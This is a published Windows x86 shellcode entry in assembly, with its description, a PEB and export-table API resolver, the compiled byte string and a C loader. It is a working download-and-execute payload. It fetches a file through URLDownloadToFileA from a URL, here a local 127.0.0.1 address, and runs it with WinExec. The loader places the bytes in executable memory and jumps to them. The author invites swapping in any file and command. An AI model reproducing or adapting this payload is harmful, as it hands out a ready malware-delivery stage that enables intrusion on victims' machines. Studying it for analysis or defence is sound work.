; Exploit Title: Windows/x86 - Download File and Execute / Dynamic PEB & EDT method Shellcode (458 bytes)
; Exploit Author: Techryptic (@Tech)
; Date: 2022-01-31
; Tested on: WIN7X86

; Shoutout to #848 Advanced Software Exploitation and DSU.

; Description:
; The shellcode works in three parts. The first part and API call is using the Kernel32.dll and calling both CreateProcessA and LoadLibraryA function. Moving onto the next API call, it utilizes the urlmon.dll and calls the URLDownloadToFileA function. The objective of this call is to download a file from our malicious URL. Finally, the third API call is using the WinExec function to run the command, which will run the file that was downloaded.
; the PEB method to locate the baseAddress of the required module and the Export Directory Table to locate symbols.
; Also the shellcode uses a hash function to gather dynamically the required symbols without worry about the length.
; Feel free to change which file is being downloaded, and what command to run the file. For example, if set to download a .vbs script, you can use the command 'cscript shellcode.vbs'.

[BITS 32]
mainentrypoint:

call geteip
geteip:
pop edx ; EDX is now base for function
lea edx, [edx-5]

mov ebp, esp
sub esp, 1000h

; Locate kernel32.dll
push edx
mov ebx, 0x4b1ffe8e
call get_module_address
pop edx

; Build kernel32.dll API function pointer table
push ebp
push edx
mov ebp, eax
lea esi, [EDX + KERNEL32HASHTABLE]
lea edi, [EDX + KERNEL32FUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

; Call LoadLibaryA to get urlmon.dll into memory
push ebp
push edx
lea eax, [EDX + URLMON]
push eax
call [EDX + LoadLibraryA]
pop edx
pop ebp

; Build urlmon.dll API function pointer table
push ebp
push edx
mov ebp, eax
lea esi, [EDX + URLMONHASHTABLE]
lea edi, [EDX + URLMONFUNCTIONSTABLE]
call get_api_address
pop edx
pop ebp

; Call URLDownloadToFileA
; pCaller NULL, URL, FILENAME, 0, 0
push eax
push 0
push 0
lea edi, [EDX + URL]
lea esi, [EDX + FILENAME]
push esi
push edi
push 0
call eax

;and esp, 0xfffffff0; Using the WinExec API to call com
call geteip2
geteip2:
pop edx ; EDX is now base for function

lea edx, [edx-122] ; yes.

mov ebp, esp
sub esp, 1000h

; Locate kernel32.dll
push edx
mov ebx, 0x4b1ffe8e ; kernel32.dll module hash
call get_module_address ; Sets EAX to kernel32.<Location>
pop edx

; Build kernel32.dll API function pointer table
push ebp
push edx
mov ebp, eax
lea esi, [EDX + WINKERNEL32HASHTABLE]
lea edi, [EDX + WINKERNEL32FUNCTIONSTABLE]
call get_api_address ; sets EAX to kernel32.WinExec function.

pop edx
pop ebp

; call winexec api
lea esi, [EDX + CMD] ;change back to EXE
push 0x00
push esi
push dword [EDX + WINKERNEL32_WINEXEC]
pop eax
call eax

get_module_address:
;walk PEB find target module
cld
xor edi, edi
mov edi, [FS:0x30]
mov edi, [edi+0xC]
mov edi, [edi+0x14]

next_module_loop:
mov esi, [edi+0x28]
xor edx, edx

module_hash_loop:
lodsw
test al, al
jz end_module_hash_loop
cmp al, 0x41
jb end_hash_check
cmp al, 0x5A
ja end_hash_check
or al, 0x20

end_hash_check:
rol edx, 7
xor dl, al
jmp module_hash_loop

end_module_hash_loop:
cmp edx, ebx
mov eax, [edi+0x10]
mov edi, [edi]
jnz next_module_loop
ret

get_api_address:
mov edx, ebp
add edx, [edx+3Ch]
mov edx, [edx+78h]
add edx, ebp
mov ebx, [edx+20h]
add ebx, ebp
xor ecx, ecx

load_api_hash:
push edi
push esi
mov esi, [esi]

load_api_name:
mov edi, [ebx]
add edi, ebp
push edx
xor edx, edx

create_hash_loop:
rol edx, 7
xor dl, [edi]
inc edi
cmp byte [edi], 0
jnz create_hash_loop

xchg eax, edx
pop edx
cmp eax, esi
jz load_api_addy
add ebx, 4
inc ecx
cmp [edx+18h], ecx
jnz load_api_name
pop esi
pop edi
ret

load_api_addy:
pop esi
pop edi
lodsd
push esi
push ebx
mov ebx, ebp
mov esi, ebx
add ebx, [edx+24h]
lea eax, [ebx+ecx*2]
movzx eax, word [eax]
lea eax, [esi+eax*4]
add eax, [edx+1ch]
mov eax, [eax]
add eax, esi
stosd
pop ebx
pop esi
add ebx, 4
inc ecx
cmp dword [esi], 0FFFFh
jnz load_api_hash

ret

CMD:
	db "cscript cats-dl.vbs", 0 ; Command that will run
FILENAME:
	db "cats-dl.vbs", 0 ; Name of the file being written to disk
URL:
	db "http://127.0.0.1:8080/cats.vbs", 0 ; Use a non-malicious file extension
URLMON:
	db "urlmon.dll", 0

KERNEL32HASHTABLE:
	dd 0x46318ac7 ; CreateProcessA
	dd 0xc8ac8026 ; LoadLibraryA
	dd 0xFFFF

KERNEL32FUNCTIONSTABLE:
CreateProcessA:
	dd 0x00000001
LoadLibraryA:
	dd 0x00000002

WINKERNEL32HASHTABLE:
	dd 0xe8bf6dad ; WinExec
	dd 0xFFFF ; make sure to end with this token

WINKERNEL32FUNCTIONSTABLE:
WINKERNEL32_WINEXEC	dd 0x00000000

URLMONHASHTABLE:
	dd 0xd95d2399 ; URLDownloadToFileA function
	dd 0xFFFF

URLMONFUNCTIONSTABLE:
URLDownloadToFileA:
	dd 0x00000003


[*]================================= POC =============================== [*]

#include <windows.h>
#include <stdio.h>


// nasm -f win32 shellcode.asm -o shellcode.o
// objdump -D ./shellcode.o |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'


char shellcode[] =
"\xe8\x00\x00\x00\x00\x5a\x8d\x52\xfb\x89\xe5\x81\xec\x00\x10"
"\x00\x00\x52\xbb\x8e\xfe\x1f\x4b\xe8\x9d\x00\x00\x00\x5a\x55"
"\x52\x89\xc5\x8d\xb2\x9e\x01\x00\x00\x8d\xba\xaa\x01\x00\x00"
"\xe8\xbd\x00\x00\x00\x5a\x5d\x55\x52\x8d\x82\x93\x01\x00\x00"
"\x50\xff\x92\xae\x01\x00\x00\x5a\x5d\x55\x52\x89\xc5\x8d\xb2"
"\xbe\x01\x00\x00\x8d\xba\xc6\x01\x00\x00\xe8\x95\x00\x00\x00"
"\x5a\x5d\x50\x6a\x00\x6a\x00\x8d\xba\x74\x01\x00\x00\x8d\xb2"
"\x68\x01\x00\x00\x56\x57\x6a\x00\xff\xd0\xe8\x00\x00\x00\x00"
"\x5a\x8d\x52\x86\x89\xe5\x81\xec\x00\x10\x00\x00\x52\xbb\x8e"
"\xfe\x1f\x4b\xe8\x2a\x00\x00\x00\x5a\x55\x52\x89\xc5\x8d\xb2"
"\xb2\x01\x00\x00\x8d\xba\xba\x01\x00\x00\xe8\x4a\x00\x00\x00"
"\x5a\x5d\x8d\xb2\x54\x01\x00\x00\x6a\x00\x56\xff\xb2\xba\x01"
"\x00\x00\x58\xff\xd0\xfc\x31\xff\x64\x8b\x3d\x30\x00\x00\x00"
"\x8b\x7f\x0c\x8b\x7f\x14\x8b\x77\x28\x31\xd2\x66\xad\x84\xc0"
"\x74\x11\x3c\x41\x72\x06\x3c\x5a\x77\x02\x0c\x20\xc1\xc2\x07"
"\x30\xc2\xeb\xe9\x39\xda\x8b\x47\x10\x8b\x3f\x75\xdb\xc3\x89"
"\xea\x03\x52\x3c\x8b\x52\x78\x01\xea\x8b\x5a\x20\x01\xeb\x31"
"\xc9\x57\x56\x8b\x36\x8b\x3b\x01\xef\x52\x31\xd2\xc1\xc2\x07"
"\x32\x17\x47\x80\x3f\x00\x75\xf5\x92\x5a\x39\xf0\x74\x0c\x83"
"\xc3\x04\x41\x39\x4a\x18\x75\xdf\x5e\x5f\xc3\x5e\x5f\xad\x56"
"\x53\x89\xeb\x89\xde\x03\x5a\x24\x8d\x04\x4b\x0f\xb7\x00\x8d"
"\x04\x86\x03\x42\x1c\x8b\x00\x01\xf0\xab\x5b\x5e\x83\xc3\x04"
"\x41\x81\x3e\xff\xff\x00\x00\x75\xad\xc3\x63\x73\x63\x72\x69"
"\x70\x74\x20\x63\x61\x74\x73\x2d\x64\x6c\x2e\x76\x62\x73\x00"
"\x63\x61\x74\x73\x2d\x64\x6c\x2e\x76\x62\x73\x00\x68\x74\x74"
"\x70\x3a\x2f\x2f\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x38"
"\x30\x38\x30\x2f\x63\x61\x74\x73\x2e\x76\x62\x73\x00\x75\x72"
"\x6c\x6d\x6f\x6e\x2e\x64\x6c\x6c\x00\xc7\x8a\x31\x46\x26\x80"
"\xac\xc8\xff\xff\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\xad"
"\x6d\xbf\xe8\xff\xff\x00\x00\x00\x00\x00\x00\x99\x23\x5d\xd9"
"\xff\xff\x00\x00\x03\x00\x00\x00";

int main(int argc, char **argv) {
	HINSTANCE hInstLib = LoadLibrary(TEXT("user32.dll"));
	int i = 0, len = 0, target_addy = 0, offset = 0x0;
	void*stage = VirtualAlloc(0, 0x1000, 0x1000,0x40 );
	printf("[*] Memory allocated: 0x%08x\n", stage);
	len = sizeof(shellcode);
	printf("[*] Size of Shellcode: %08x\n", len);
	memmove(stage, shellcode, 0x1000);
	printf("[*] Shellcode copied\n");
	target_addy = (char*)stage + offset;
	printf("[*] Adjusting offset: 0x%08x\n", target_addy);
	__asm {
		int 3
		mov eax, target_addy
		jmp eax
	}
}